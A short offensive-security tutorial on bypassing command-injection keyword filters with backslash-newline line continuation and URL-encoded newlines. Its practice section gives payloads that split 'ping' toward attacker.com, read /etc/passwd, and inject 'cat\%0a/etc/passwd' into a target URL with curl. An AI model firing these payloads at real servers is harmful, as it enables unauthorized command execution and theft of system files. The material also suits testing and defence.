---
title: Bypass Command Filters with Backslash and Newline
description: Learn how to exploit backslash and newline sequences to bypass command
  filters in web apps, enhancing command injection techniques.
keywords:
- backslash newline escape
- command injection
- filter bypass
- web application security
- URL-encoded newline
- line continuation
- escape sequence exploitation
---

# Bypass With Backslash Newline

## Context

The goal of this article is to demonstrate how an attacker can exploit command injection vulnerabilities in web applications by using backslash-newline escape sequences. This technique is particularly effective for bypassing filters that aim to prevent injection by blocking certain keywords or commands. A fundamental understanding of newline characters, escape sequences, URL encoding, and command injection techniques is assumed.

## Theory

### Backslash-Newline as a Line Continuation Mechanism

In many Unix-based shells, a backslash followed by a newline character serves as a line continuation mechanism. This means that the shell treats the combination of a backslash and a newline as if they do not exist, effectively spanning the command over multiple lines but executing it as a single logical line. This behavior can be exploited in command injection scenarios to bypass filtering mechanisms.

Shell filters that aim to block dangerous keywords (such as 'cat', 'ping', or specific options) may fail to detect malicious input if these payloads are split between lines using a backslash-newline sequence.

### Escape Sequence Exploitation in Command Injection

Attackers can insert a backslash followed by a newline character into their payloads to evade static keyword or character filters during command injection attacks. This approach takes advantage of filters that process input character-by-character or on a single line. By splitting keywords or operators across lines, the attacker bypasses detection and enables command execution.

### URL-Encoded Newline and Slash-Newline Injection

In a web-based context, newline characters can be represented using URL encoding, often as '%0a' (line feed) or '%0d%0a' (carriage return followed by a line feed). This encoding allows attackers to remotely inject backslash-newline sequences in HTTP requests. By leveraging these encoded newlines, an attacker can bypass input validation that would otherwise filter out newline characters.

## Practice

### Bypassing Filters with Backslash-Newline in Command Injection

- Identify a vulnerable web parameter that is susceptible to command injection but employs filtering to block basic command keywords. Focus on parameters where direct injection attempts are blocked due to the presence of filters.

- Use the following payload to evade filters:
  
  ```bash
  ping\
  -c 1 attacker.com
  ```

  This command splits 'ping -c' so that the '-c' option is on a new line, evading detection by simple keyword filters.

- Another example payload:
  
  ```bash
  cat\
  /etc/passwd
  ```

  By splitting the command with a backslash-newline, you can bypass filters preventing the execution of 'cat /etc/passwd'.

- For web-based injection points, consider using URL-encoded newline characters:
  
  ```http
  ls\%0a-la
  ```

  This uses a URL-encoded newline to bypass filters in applications processing HTTP parameters.

- Execute the command with a tool such as curl:

  ```bash
  curl 'http://target/app?input=cat\%0a/etc/passwd'
  ```

  This HTTP request sends the encoded payload to the target application, aiming to trigger the vulnerability and achieve command execution.

The above techniques highlight how backslash-newline escape sequences can be effectively used to bypass command injection filters and execute commands on a vulnerable server.

## Tools

- **curl**
- **Burp Suite**